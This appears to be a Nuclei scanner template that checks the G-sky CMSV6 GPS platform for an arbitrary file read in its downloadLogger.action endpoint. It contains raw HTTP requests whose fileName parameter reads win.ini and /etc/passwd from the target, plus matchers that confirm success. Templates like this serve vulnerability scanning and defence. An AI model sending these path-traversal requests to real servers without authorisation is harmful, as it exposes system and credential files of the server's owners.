http:
    - matchers:
        - part: body
          type: word
          words:
            - 'root:'
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
          Accept: */*
          Connection: Keep-Alive
        - |
          GET /808gps/logger/downloadLogger.action?fileName=//etc//passwd HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
          Accept: */*
          Connection: Keep-Alive
id: G-sky-CMSV6-downloadLogger_fileread
info:
    author: pitaya
    name: G-sky-CMSV6-downloadLogger_fileread
    severity: high
    tags:
        - GPS
